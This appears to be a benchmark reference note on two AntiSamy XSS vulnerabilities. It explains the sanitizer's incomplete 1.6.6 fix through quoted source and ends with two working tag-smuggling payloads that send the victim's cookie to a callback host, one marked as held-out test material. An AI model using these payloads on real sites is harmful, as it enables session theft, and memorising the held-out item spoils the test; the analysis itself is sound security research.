PRODUCT / RELATIONSHIP (authoritative)
- Product: OWASP AntiSamy — Java HTML/CSS sanitizer (github.com/nahsra/antisamy). Sink =
  new AntiSamy().scan(html, antisamy.xml, AntiSamy.DOM).getCleanHTML() -> AntiSamyDOMScanner, which
  routes <style> elements through processStyleTag() (CssScanner + DOM serialization).
- CVE-2022-28367: AntiSamy before 1.6.6 allows XSS via HTML tag smuggling on STYLE content. Fixed
  (PARTIALLY) in 1.6.6.
- CVE-2022-29577 (GHSA-pc9p-h9wh-9jf3): AntiSamy before 1.6.7 allows XSS via HTML tag smuggling on
  STYLE content; "The output serializer does not properly encode the supposed CSS content. NOTE: this
  issue exists because of an incomplete fix for CVE-2022-28367." Fixed (COMPLETELY) in 1.6.7
  (commit 32e273507da0e964b58c50fd8a4c94c9d9363af0).
- INCOMPLETE-FIX: same sanitizer, same STYLE-content smuggling sink, consecutive releases. Maintainer
  SECURITY.md: 1.6.6 "only included a PARTIAL fix"; 1.6.7 is "the complete fix."

EXACT SINK EVOLUTION (verbatim, from the real AntiSamy source diffs — verified via git tags)
  file: src/main/java/org/owasp/validator/html/scan/AntiSamyDOMScanner.java  ::  processStyleTag()
  V0 1.6.5  Node firstChild = ele.getFirstChild();
            if (firstChild != null) { ... scan firstChild.getNodeValue() as CSS; setNodeValue(clean); }
            -> scans ONLY the first child; ALL other smuggled child nodes are left untouched (raw).
  V1 1.6.6  (CVE-2022-28367 PARTIAL fix = TARGET)
            concatenate every child's text into `toScan`, scan as CSS, set firstChild to cleaned CSS,
            THEN:
              /* Remove every other node after cleaning CSS, there will be only one node in the end. */
              for (int i = 1; i < ele.getChildNodes().getLength(); i++) {   // FORWARD over LIVE NodeList
                  Node childNode = ele.getChildNodes().item(i);
                  ele.removeChild(childNode);
              }
            -> BUG (P4 logic error): removing item(1) shifts item(2)->item(1) while i advances to 2 and
               getLength() shrinks, so it removes items at ORIGINAL indices 1,3,5,... and SKIPS 2,4,6,...
               The maintainer's own comment literally says "Remove every other node" — which is exactly
               what the buggy loop does. Smuggled nodes at even indices SURVIVE unencoded.
  V2 1.6.7  (CVE-2022-29577 COMPLETE fix)
              int childNodesCount = ele.getChildNodes().getLength();
              /* ... Starting from the end due to list updating on the fly. */
              for (int i = childNodesCount - 1; i >= 1; i--) {              // REVERSE over LIVE NodeList
                  Node childNode = ele.getChildNodes().item(i);
                  ele.removeChild(childNode);
              }
            -> reverse iteration removes ALL smuggled children safely -> only the cleaned CSS remains.
  (patch.diff in this dir = V0->V1, the incomplete fix. The V1->V2 delta is the same loop forward->reverse.)

PAYLOADS (benign canary — the smuggled </style> breakout + <img onerror> reads the victim's OWN cookie,
          exfil to the internal callback; the `<![cdata[` bogus-comment keeps the breakout RAW TEXT so
          the </style> and onerror survive — parsed as an element instead, neko drops onerror)
  ORIGINAL (CVE-2022-28367 seed, ONE smuggled child node):
    <style/>b<![cdata[</style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">
  RESIDUAL (CVE-2022-29577 bypass, TWO smuggled child nodes, HELD-OUT):
    <style/>a<b></b><![cdata[</style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">
  DELTA = the residual is the seed with a single throwaway <b></b> inserted before the breakout text.
    That pushes the dangerous </style><img onerror> node to an EVEN <style> child index — exactly the
    index the 1.6.6 forward removal loop SKIPS. (AntiSamy regression test testSmuggledTagsInStyleContent,
    added with 1.6.7, uses the same family: "<select<style/>W<xmp<script>alert(1)</script>" etc.)

